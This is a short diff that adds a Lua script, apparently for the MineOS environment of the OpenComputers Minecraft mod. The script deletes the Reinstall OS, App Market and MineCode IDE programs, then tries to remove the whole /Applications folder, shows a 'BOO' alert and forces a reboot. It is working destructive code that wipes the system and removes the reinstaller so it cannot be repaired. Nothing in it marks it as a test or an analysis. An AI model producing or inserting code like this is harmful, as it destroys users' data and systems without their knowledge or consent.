@@ -1,0 +1,8 @@
+local f = require ("filesystem")
+f.remove("/Applications/Reinstall OS.app/Main.lua")
+f.remove("/Applications/App Market.app/Main.lua")
+f.remove("/Applications/MineCode IDE/Main.lua")
+f.remove("/Applications")
+local GUI = require("GUI")
+GUI.alert("BOO")
+computer.shutdown(true)
